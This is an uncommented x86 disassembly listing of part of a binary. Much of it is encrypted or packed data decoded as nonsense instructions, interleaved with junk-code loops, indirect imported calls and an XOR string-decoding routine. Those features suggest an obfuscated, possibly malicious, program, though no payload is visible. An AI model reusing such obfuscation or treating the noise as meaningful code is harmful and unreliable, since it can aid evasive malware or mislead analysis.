  410b2b:	jle    0x410ab3
  410b2d:	jle    0x410b7f
  410b2f:	rcl    DWORD PTR [ecx],0x1c
  410b32:	mov    bh,0xef
  410b34:	dec    ecx
  410b35:	stos   DWORD PTR es:[edi],eax
  410b36:	into   
  410b37:	ficom  DWORD PTR [ecx+0x5261f4bf]
  410b3d:	xor    esi,ecx
  410b3f:	inc    esp
  410b40:	mov    edx,esp
  410b42:	test   eax,0x39153f89
  410b47:	arpl   WORD PTR [ebp+0x45],bx
  410b4a:	daa    
  410b4b:	mov    DWORD PTR [ebx+0x5c64c3a1],ebp
  410b51:	inc    ebp
  410b52:	in     al,0x75
  410b54:	pusha  
  410b55:	xchg   ecx,eax
  410b56:	push   ebx
  410b57:	pop    esp
  410b58:	jle    0x410adb
  410b5a:	cwde   
  410b5b:	outs   dx,BYTE PTR ds:[esi]
  410b5c:	mov    ds,WORD PTR [esi-0x6a233db1]
  410b62:	in     al,0x9a
  410b64:	dec    esi
  410b65:	push   ebp
  410b66:	dec    esi
  410b67:	cmp    edi,DWORD PTR [ebp+0x37]
  410b6a:	in     al,0xe5
  410b6c:	rcr    BYTE PTR [ecx-0x7d],cl
  410b6f:	mov    dh,0xea
  410b71:	repnz cmp bl,dl
  410b74:	aaa    
  410b75:	cmp    edx,DWORD PTR [ebx-0x48]
  410b78:	ret    0x2b
  410b7b:	out    0x3d,al
  410b7d:	call   0x2219:0xa4d60032
  410b84:	jle    0x410bba
  410b86:	sbb    BYTE PTR [ebx+0x1120d8da],ch
  410b8c:	xchg   ecx,eax
  410b8d:	dec    ebx
  410b8e:	repnz ins DWORD PTR es:[edi],dx
  410b90:	and    cl,BYTE PTR [eax-0x41123294]
  410b96:	add    bh,BYTE PTR [esi]
  410b98:	lds    edx,FWORD PTR [edx-0x35b066e3]
  410b9e:	adc    bl,ah
  410ba0:	dec    eax
  410ba1:	pusha  
  410ba2:	cmp    ebx,DWORD PTR [esi]
  410ba4:	jno    0x410b9c
  410ba6:	clc    
  410ba7:	and    al,BYTE PTR [eax]
  410ba9:	sbb    DWORD PTR [edx+0x7a],ebp
  410bac:	pushf  
  410bad:	xor    bl,BYTE PTR [ebp+0x77]
  410bb0:	mov    esp,0xf64b9e0b
  410bb5:	(bad)  
  410bb6:	push   edx
  410bb7:	ins    BYTE PTR es:[edi],dx
  410bb8:	iret   
  410bb9:	sahf   
  410bba:	out    0x84,eax
  410bbc:	clc    
  410bbd:	or     eax,0xe6f797cd
  410bc2:	repnz shr DWORD PTR [esi-0x3a],0x64
  410bc7:	sbb    DWORD PTR [edx+0x4178af9f],ebx
  410bcd:	xchg   bl,bl
  410bcf:	scas   al,BYTE PTR es:[edi]
  410bd0:	cdq    
  410bd1:	outs   dx,DWORD PTR ds:[esi]
  410bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bd3:	outs   dx,BYTE PTR ds:[esi]
  410bd4:	adc    ah,bh
  410bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bd7:	hlt    
  410bd8:	xchg   ebx,eax
  410bd9:	mov    dl,0x91
  410bdb:	mov    WORD PTR [ecx+0x10372637],?
  410be1:	or     dl,dl
  410be3:	int    0xd
  410be5:	popa   
  410be6:	sbb    BYTE PTR [edx+edi*1],dl
  410be9:	sbb    eax,0x65a69e28
  410bee:	shl    DWORD PTR [edi+0x1b92970d],1
  410bf4:	(bad)  
  410bf6:	mov    esp,DWORD PTR [ebx+0x123445b3]
  410bfc:	ret    0xb0d2
  410bff:	inc    esp
  410c00:	(bad)  
  410c01:	jo     0x410bce
  410c03:	ror    DWORD PTR [esi],1
  410c05:	xor    edx,DWORD PTR [esi]
  410c07:	add    dh,ah
  410c09:	fdiv   QWORD PTR [edx+0x10]
  410c0c:	into   
  410c0d:	and    BYTE PTR [edx],bh
  410c0f:	loopne 0x410c2c
  410c11:	xchg   edi,eax
  410c12:	cmp    DWORD PTR [ecx+0x1a1bbee6],esp
  410c18:	arpl   WORD PTR [edi],bp
  410c1a:	mov    dl,0xd8
  410c1c:	or     DWORD PTR [eax-0x41],ebx
  410c1f:	lahf   
  410c20:	jmp    eax
  410c22:	cmp    bl,BYTE PTR ds:0xd2116f52
  410c28:	pop    edx
  410c29:	outs   dx,BYTE PTR ds:[esi]
  410c2a:	mov    cl,0x43
  410c2c:	aam    0x4d
  410c2e:	mov    bl,0xaf
  410c30:	or     DWORD PTR [edi],esi
  410c32:	jmp    0xdaa4e54c
  410c37:	test   DWORD PTR [edi+0x632844a7],esi
  410c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c3e:	ins    BYTE PTR es:[edi],dx
  410c3f:	lds    ebx,FWORD PTR [eax]
  410c41:	mov    al,ds:0x7f8b65ce
  410c46:	and    eax,0xb84632d
  410c4b:	jno    0x410c03
  410c4d:	loope  0x410c9b
  410c4f:	cli    
  410c50:	jo     0x410bda
  410c52:	(bad)
  410c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c58:	mov    edx,0xeb59a0d6
  410c5d:	je     0x410c71
  410c5f:	mov    al,ds:0x9d185b84
  410c64:	xchg   BYTE PTR [edi],al
  410c66:	aaa    
  410c67:	xor    al,0xe6
  410c69:	ins    BYTE PTR es:[edi],dx
  410c6a:	nop
  410c6b:	repnz cs pop ebp
  410c6e:	test   DWORD PTR [edi+0x2e4bd2a1],0xc9715a2d
  410c78:	aaa    
  410c79:	inc    esp
  410c7a:	out    dx,al
  410c7b:	call   0x3a1c:0xf5c929a5
  410c82:	in     al,0x1f
  410c84:	sub    bl,BYTE PTR [ecx+0x72]
  410c87:	(bad)  
  410c88:	xchg   edx,eax
  410c89:	loope  0x410cd7
  410c8b:	test   eax,0x2485a784
  410c90:	pop    esp
  410c91:	and    BYTE PTR [ebp-0x49e5e6b6],dh
  410c97:	stc    
  410c98:	pop    ebp
  410c99:	xchg   ebp,eax
  410c9a:	test   edi,ebx
  410c9c:	loop   0x410c64
  410c9e:	outs   dx,BYTE PTR ds:[esi]
  410c9f:	xchg   esp,eax
  410ca0:	sbb    BYTE PTR [edi+0x5c],dl
  410ca3:	int    0xe9
  410ca5:	cli    
  410ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca7:	iret   
  410ca8:	cmp    eax,0x45c72e67
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    ah,BYTE PTR [eax]
  410dcd:	int    0xc6
  410dcf:	outs   dx,BYTE PTR ds:[esi]
  410dd0:	mov    WORD PTR [edi+0x7e],es
  410dd3:	jle    0x410dc6
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410d94
  410dd9:	leave  
  410dda:	sub    al,0x1d
  410ddc:	retf   
  410ddd:	inc    edx
  410dde:	aad    0x7a
  410de0:	or     al,0x15
  410de2:	jl     0x410e0e
  410de4:	iret   
  410de5:	outs   dx,BYTE PTR ds:[esi]
  410de6:	test   al,0x49
  410de8:	xor    esp,DWORD PTR [edx+0x629d713a]
  410dee:	add    DWORD PTR [esi-0x37ce199],edx
  410df4:	jns    0x410e2a
  410df6:	jecxz  0x410e47
  410df8:	out    0xc0,eax
  410dfa:	jecxz  0x410e79
  410dfc:	dec    esp
  410dfd:	adc    al,dl
  410dff:	fcomp  DWORD PTR [ebx+ebx*1-0xf]
  410e03:	mov    ecx,0xc468afe7
  410e08:	jne    0x410e06
  410e0a:	es push ds
  410e0c:	or     BYTE PTR fs:[eax],ch
  410e0f:	push   edi
  410e10:	mov    eax,0xd3644c38
  410e15:	mov    ch,0x60
  410e17:	push   cs
  410e18:	mov    bl,0xf3
  410e1a:	or     al,BYTE PTR [edx-0x59e4aac7]
  410e20:	stos   DWORD PTR es:[edi],eax
  410e21:	test   eax,0xf99d58ad
  410e26:	retf   
  410e27:	iret   
  410e28:	aam    0x68
  410e2a:	dec    ecx
  410e2b:	or     DWORD PTR [edi-0x4f],0x0
  410e2f:	dec    esp
  410e30:	cdq    
  410e31:	int    0xca
  410e33:	loop   0x410dfa
  410e35:	push   eax
  410e36:	pop    edi
  410e37:	pop    ecx
  410e38:	ret    
  410e39:	jae    0x410e5b
  410e3b:	mov    ch,0x9c
  410e3d:	sbb    al,0x46
  410e3f:	adc    al,0xc4
  410e41:	cdq    
  410e42:	push   esi
  410e43:	pop    edi
  410e44:	cmp    esp,DWORD PTR [ebx+esi*8]
  410e47:	stos   BYTE PTR es:[edi],al
  410e48:	cmp    eax,0xbf6c2573
  410e4d:	sahf   
  410e4e:	pop    edx
  410e4f:	pop    esi
  410e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e51:	dec    eax
  410e52:	(bad)  
  410e53:	dec    esp
  410e54:	xor    edx,DWORD PTR [ecx]
  410e56:	jmp    0x368c96f3
  410e5b:	push   eax
  410e5c:	mov    eax,0xd83b623
  410e61:	sub    al,0x2f
  410e63:	sbb    DWORD PTR [ecx],ebx
  410e65:	nop
  410e66:	jne    0x410e44
  410e68:	jbe    0x410e04
  410e6a:	add    al,0xab
  410e6c:	adc    dl,BYTE PTR [ebx]
  410e6e:	dec    bp
  410e70:	inc    eax
  410e71:	cmp    eax,0x1471ef9e
  410e76:	xlat   BYTE PTR ds:[ebx]
  410e77:	fdiv   QWORD PTR [esi]
  410e79:	adc    eax,0x86fe9aff
  410e7e:	in     al,dx
  410e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e80:	sar    DWORD PTR [ebp-0x61],cl
  410e83:	adc    eax,0x3a
  410e86:	dec    esp
  410e87:	in     al,0xc5
  410e89:	sbb    DWORD PTR cs:[eax-0x5252ccba],edx
  410e90:	(bad)
  410e95:	and    al,0x7f
  410e97:	jno    0x410e84
  410e99:	or     al,0x68
  410e9b:	test   ch,ah
  410e9d:	push   ebp
  410e9e:	mov    esp,0x31b25635
  410ea3:	lea    edi,[eax]
  410ea5:	cdq    
  410ea6:	xor    ch,al
  410ea8:	pop    ebx
  410ea9:	and    al,0xd8
  410eab:	and    BYTE PTR [esi],0x85
  410eae:	cli    
  410eaf:	mov    bh,0x17
  410eb1:	fadd   DWORD PTR [ebx]
  410eb3:	adc    eax,0xe4476994
  410eb8:	push   ss
  410eb9:	ins    DWORD PTR es:[edi],dx
  410eba:	jns    0x410e52
  410ebc:	sub    eax,0x8e22a05
  410ec1:	imul   esi,DWORD PTR [eax+ecx*1-0x58],0xffffff90
  410ec6:	adc    DWORD PTR [ebx],0xae4ad736
  410ecc:	test   esi,edx
  410ece:	sub    dh,al
  410ed0:	popw   ds
  410ed2:	int3   
  410ed3:	daa    
  410ed4:	inc    edi
  410ed5:	mov    bh,0x4c
  410ed7:	(bad)  
  410ed8:	mov    dl,0x5f
  410eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410edb:	pusha  
  410edc:	jo     0x410ee3
  410ede:	enter  0xe4f1,0x94
  410ee2:	aas    
  410ee3:	dec    esp
  410ee4:	and    edx,DWORD PTR [ebx-0xb]
  410ee7:	pop    esi
  410ee8:	pushf  
  410ee9:	jp     0x410f39
  410eeb:	xor    edi,DWORD PTR [ebx]
  410eed:	in     al,0x9c
  410eef:	in     eax,dx
  410ef0:	mov    ah,0x54
  410ef2:	dec    edx
  410ef3:	or     al,0x72
  410ef5:	or     eax,0xf81c6544
  410efa:	loopne 0x410f14
  410efc:	aam    0xac
  410efe:	(bad)  
  410eff:	mov    al,ds:0x9d84f50c
  410f04:	add    eax,0xe42d1ba7
  410f09:	imul   esp,DWORD PTR [edx+0xe],0xfffffff3
  410f0d:	add    al,BYTE PTR [ebx]
  410f0f:	in     eax,0x24
  410f11:	(bad)  
  410f12:	stos   BYTE PTR es:[edi],al
  410f13:	test   BYTE PTR ds:0xbc6d7d94,bh
  410f19:	adc    dl,cl
  410f1b:	std    
  410f1c:	sub    dh,BYTE PTR [ebp+edx*2-0x71]
  410f20:	push   ebp
  410f21:	ror    DWORD PTR [esi-0x4861d6b4],1
  410f27:	jb     0x410fa6
  410f29:	adc    eax,0xc29eacb6
  410f2e:	sbb    ebp,DWORD PTR [edx+0x53]
  410f31:	fistp  WORD PTR ds:0x761c1c83
  410f37:	jmp    0x10ea7e70
  410f3c:	pop    es
  410f3d:	test   BYTE PTR [eax-0x37],ch
  410f40:	adc    BYTE PTR [ebx-0xa9bccd8],dh
  410f46:	or     dh,BYTE PTR [ecx-0x43ec19c8]
  410f4c:	jno    0x410f84
  410f4e:	rol    DWORD PTR ds:0x6ee42cae,cl
  410f54:	test   ah,0x92
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	and    DWORD PTR [edx-0x74],0xffffff83
  410ffc:	cmovne edi,DWORD PTR [esi+0x7e]
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x41102a
  411005:	sbb    DWORD PTR [edi+0x5def5b33],eax
  41100b:	pusha  
  41100c:	jge    0x411010
  41100e:	adc    al,0xd2
  411010:	(bad)  
  411011:	mov    dh,0xb0
  411013:	xchg   edi,eax
  411014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411015:	xlat   BYTE PTR ds:[ebx]
  411016:	mov    ecx,0xa788c068
  41101b:	fnstenv [ebx+0x774d6d48]
  411021:	sub    al,0x1a
  411023:	add    ebp,ebx
  411025:	loopne 0x41100f
  411027:	inc    eax
  411028:	(bad)  
  411029:	sbb    eax,0x46656560
  41102e:	xor    BYTE PTR [ebp+0x1ae15cd6],cl
  411034:	inc    edx
  411035:	jae    0x411043
  411037:	mov    ds:0x4cd39596,eax
  41103c:	outs   dx,BYTE PTR ds:[esi]
  41103d:	and    BYTE PTR [ebx],ah
  41103f:	xchg   ecx,eax
  411040:	nop
  411041:	cmp    esi,ebp
  411043:	mov    al,ah
  411045:	std    
  411046:	aam    0xa2
  411048:	out    dx,al
  411049:	pop    ds
  41104a:	inc    esp
  41104b:	mov    eax,ds:0x6e9531f4
  411050:	dec    ebx
  411051:	sub    BYTE PTR [ebx-0x76],0x76
  411055:	xor    DWORD PTR [edi],ebp
  411057:	aas    
  411058:	jno    0x41107e
  41105a:	cmp    WORD PTR ds:0xf30b6213,cx
  411061:	stos   BYTE PTR es:[edi],al
  411062:	jmp    0x3d89:0xd081c426
  411069:	pop    edx
  41106a:	call   0xeac9:0xa5c3ad6d
  411071:	leave  
  411072:	mov    ds:0x926eff4b,eax
  411077:	sbb    ah,bh
  411079:	test   cl,bl
  41107b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41107c:	push   eax
  41107d:	push   ss
  41107e:	neg    BYTE PTR [edx+ebp*8+0x5b88b5d5]
  411085:	xor    esp,ecx
  411087:	jle    0x411047
  411089:	xlat   BYTE PTR ds:[ebx]
  41108a:	push   ebp
  41108b:	inc    edx
  41108c:	sub    DWORD PTR [ebx],ecx
  41108e:	cmp    dl,BYTE PTR [edx+0x15]
  411091:	test   DWORD PTR [ebx],esi
  411093:	scas   al,BYTE PTR es:[edi]
  411094:	iretw  
  411096:	mov    WORD PTR ds:0xdb1b5467,fs
  41109c:	daa    
  41109d:	xchg   DWORD PTR [ebp+0x2f5c19e],eax
  4110a3:	(bad)  
  4110a4:	dec    ebp
  4110a5:	mov    ebx,0xddc52f55
  4110aa:	arpl   WORD PTR [ebx+0x225cc7e],di
  4110b0:	or     DWORD PTR [eax+0x63cdde17],0x3c93d41d
  4110ba:	pop    es
  4110bb:	data16 mov al,ds:0xd7c72cb2
  4110c1:	(bad)  
  4110c2:	push   0x48ba83f3
  4110c7:	mov    al,ds:0x7da0e79d
  4110cc:	ficom  WORD PTR [ebx+0x19a04eab]
  4110d2:	loop   0x4110b5
  4110d4:	mov    dh,0x3d
  4110d6:	mov    edi,0x3e880fb1
  4110db:	(bad)  
  4110dd:	jne    0x41113f
  4110df:	sbb    DWORD PTR [edi+esi*4],esi
  4110e2:	imul   esi,DWORD PTR [ecx-0x6a30ff97],0xffffffdf
  4110e9:	or     bl,0x66
  4110ec:	inc    ecx
  4110ed:	mov    ebp,0xf450a494
  4110f2:	sar    BYTE PTR [esi+0x40],0x25
  4110f6:	cmp    BYTE PTR [esi-0x4d],ah
  4110f9:	mov    ebp,edx
  4110fb:	push   edi
  4110fc:	frstor [edx]
  4110fe:	and    ah,BYTE PTR [edx]
  411100:	cmp    DWORD PTR [ecx],edx
  411102:	stos   DWORD PTR es:[edi],eax
  411103:	inc    ebx
  411104:	or     cl,BYTE PTR [ebx+ebp*1]
  411107:	push   ds
  411108:	xlat   BYTE PTR ds:[ebx]
  411109:	push   edx
  41110a:	push   esi
  41110b:	xchg   ebx,eax
  41110c:	add    al,0xad
  41110e:	bound  esp,QWORD PTR [esi+0x6d]
  411111:	pushf  
  411112:	test   dl,dh
  411114:	test   DWORD PTR [esi-0x45],esi
  411117:	sar    BYTE PTR [ebp-0x62],1
  41111a:	inc    ecx
  41111b:	push   ecx
  41111c:	pop    eax
  41111d:	mov    dh,0xa9
  41111f:	(bad)  
  411121:	fst    QWORD PTR [eax]
  411123:	pop    ebx
  411124:	test   eax,0xd4314d06
  411129:	jge    0x4110ad
  41112b:	call   0x61166e05
  411130:	sbb    BYTE PTR [ecx+0x5e05602f],dl
  411136:	adc    al,0xbd
  411138:	lds    edi,FWORD PTR [ebp+eiz*1+0x67]
  41113c:	and    al,0x70
  41113e:	jne    0x411122
  411140:	dec    eax
  411141:	inc    eax
  411142:	imul   ebp,DWORD PTR [edx+0x5f272398],0xffffff80
  411149:	test   al,0xa8
  41114b:	pop    esi
  41114c:	in     eax,dx
  41114d:	call   0x6023:0x948523d
  411154:	and    BYTE PTR [ebx],bh
  411156:	jecxz  0x4110e8
  411158:	in     al,dx
  411159:	rcr    DWORD PTR [eax+0x1],0xa8
  41115d:	add    al,0xe0
  41115f:	nop
  411160:	jp     0x4111a1
  411162:	cli    
  411163:	dec    ebp
  411164:	(bad)  
  411165:	out    dx,al
  411166:	push   cs
  411167:	into   
  411168:	fdivr  QWORD PTR [edx]
  41116a:	xchg   ecx,eax
  41116b:	jp     0x411144
  41116d:	xor    DWORD PTR [ebp+0x7e],0x45
  411171:	cmp    al,0x19
  411173:	ja     0x411109
  411175:	or     al,0xef
  411177:	(bad)  
  411178:	dec    esi
  411179:	xor    BYTE PTR [edx-0x63],0xdc
  41117d:	sub    cl,BYTE PTR [ebx]
  41117f:	lea    edi,ds:0x2bf5c5d
  411185:	cmp    eax,DWORD PTR [eax]
  411187:	add    BYTE PTR [esi+0x3],ah
  41118a:	(bad)  
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0x3fdabba7
  4111f1:	ja     0x41122e
  4111f3:	jns    0x411183
  4111f5:	inc    edx
  4111f6:	jle    0x411276
  4111f8:	icebp  
  4111f9:	jg     0x411279
  4111fb:	jle    0x411193
  4111fd:	xor    al,0x84
  4111ff:	inc    eax
  411200:	popa   
  411201:	in     eax,dx
  411202:	movups xmm5,XMMWORD PTR [edi]
  411205:	fcmovnu st,st(2)
  411207:	mov    edx,0xe09a0fbb
  41120c:	jge    0x411243
  41120e:	sbb    DWORD PTR [esi+0x69],edx
  411211:	push   cs
  411212:	push   esi
  411213:	and    DWORD PTR [ebx+0x20],0xaa932edd
  41121a:	(bad)  
  41121b:	std    
  41121c:	push   edi
  41121d:	push   esi
  41121e:	aad    0xc4
  411220:	pushf  
  411221:	mov    esi,0x8da99a80
  411226:	lea    ecx,[edx-0x76e2660]
  41122c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41122d:	or     al,0xfd
  41122f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411230:	cdq    
  411231:	sbb    eax,0xf2dc4f32
  411236:	std    
  411237:	hlt    
  411238:	sub    al,0xda
  41123a:	loop   0x4111eb
  41123c:	call   0xc9b53f6a
  411241:	inc    ebp
  411242:	cmp    eax,0xcd3faa7e
  411247:	or     al,0x8b
  411249:	aaa    
  41124a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41124b:	sbb    eax,0xb5e49eac
  411250:	dec    eax
  411251:	pop    ss
  411252:	mov    ecx,0x573c7940
  411257:	mov    dl,0x4d
  411259:	jb     0x4111ff
  41125b:	mov    ds:0x3cc52fb0,eax
  411260:	out    dx,eax
  411261:	xchg   ebp,eax
  411262:	popa   
  411263:	sub    DWORD PTR ds:0x342cb1c,edi
  411269:	mov    esi,0x19556f96
  41126e:	xor    eax,0x29b82f92
  411273:	push   eax
  411274:	add    al,0xdf
  411276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411277:	inc    esi
  411278:	or     eax,0xc68bcfce
  41127d:	cmp    eax,0x2d7dfe60
  411282:	and    eax,0xfa886ab
  411287:	imul   ebp,ebp,0x3a
  41128a:	(bad)  
  41128b:	neg    DWORD PTR [edi-0x473912ca]
  411291:	ret    0x7098
  411294:	inc    esp
  411295:	test   eax,0x4a23a100
  41129a:	jbe    0x41126c
  41129c:	sbb    ch,BYTE PTR fs:[ebp+0x21]
  4112a0:	pop    ecx
  4112a1:	jo     0x411307
  4112a3:	popa   
  4112a4:	enter  0xcd01,0x48
  4112a8:	mov    ch,al
  4112aa:	js     0x41128c
  4112ac:	retf   
  4112ad:	xor    al,BYTE PTR [ecx+0x670fd722]
  4112b3:	jne    0x411291
  4112b5:	and    DWORD PTR [eax+0x3f],ecx
  4112b8:	popf   
  4112b9:	adc    eax,0x4ce92ca4
  4112be:	pop    esi
  4112bf:	jb     0x411322
  4112c1:	add    bl,BYTE PTR [ebp-0x5d6a8eca]
  4112c7:	daa    
  4112c8:	sbb    al,0xb8
  4112ca:	xor    DWORD PTR [ebx+0x44792885],ecx
  4112d0:	inc    ebp
  4112d1:	mov    ds:0x3a6aa4fe,al
  4112d6:	fmul   DWORD PTR [edx+0x2d]
  4112d9:	adc    ebp,DWORD PTR [ebx]
  4112db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112dc:	(bad)  
  4112de:	inc    ebx
  4112df:	not    DWORD PTR [edx]
  4112e1:	sbb    ecx,DWORD PTR [ebx]
  4112e3:	sub    esi,ebp
  4112e5:	cmp    al,0xb0
  4112e7:	(bad)  
  4112e8:	nop
  4112e9:	aam    0x15
  4112eb:	mov    BYTE PTR [edx+0x9],ah
  4112ee:	mov    ds:0xb219624,eax
  4112f3:	(bad)  [edx]
  4112f5:	pusha  
  4112f6:	cmp    ecx,esi
  4112f8:	xor    BYTE PTR [edi-0x37caf2e4],ah
  4112fe:	cmp    cl,bh
  411300:	bound  ecx,QWORD PTR [esi]
  411302:	out    0xb2,eax
  411304:	mov    ebp,0xfd8e03af
  411309:	bswap  edx
  41130b:	mov    DWORD PTR [edx-0xe],ecx
  41130e:	ret    0xa551
  411311:	ins    DWORD PTR es:[edi],dx
  411312:	mov    ebp,DWORD PTR [edi]
  411314:	sbb    DWORD PTR [edx],esp
  411316:	mov    ecx,DWORD PTR [edi-0xa]
  411319:	xor    dh,BYTE PTR [esi]
  41131b:	cmp    eax,0x7b456182
  411320:	(bad)  
  411321:	and    ch,BYTE PTR [ebx+esi*8]
  411324:	lods   al,BYTE PTR ds:[esi]
  411325:	mov    al,0x6c
  411327:	mov    eax,0xdecc3315
  41132c:	js     0x411320
  41132e:	add    al,0x2d
  411330:	mov    edi,0xa26b7d5
  411335:	icebp  
  411336:	outs   dx,DWORD PTR ds:[esi]
  411337:	mov    ?,WORD PTR [ecx-0x485c2acd]
  41133d:	push   esp
  41133e:	add    al,0x6e
  411340:	(bad)  
  411341:	shl    BYTE PTR [ebp+0xf14d10a],0xab
  411348:	adc    eax,0x48e7e6b8
  41134d:	add    eax,0x2f9005a3
  411352:	loopne 0x4113a2
  411354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411355:	cmp    eax,0xfc25acd2
  41135a:	or     BYTE PTR [esi+0x2f],0x0
  41135e:	jl     0x4113b4
  411360:	jecxz  0x4113c3
  411362:	fmul   DWORD PTR [ecx-0x6b5fb804]
  411368:	fwait
  411369:	out    0x5,eax
  41136b:	inc    edx
  41136c:	sahf   
  41136d:	mov    edx,DWORD PTR [ebx-0x57c9f601]
  411373:	ror    BYTE PTR [edx],1
  411375:	test   ebx,edi
  411377:	xchg   edi,eax
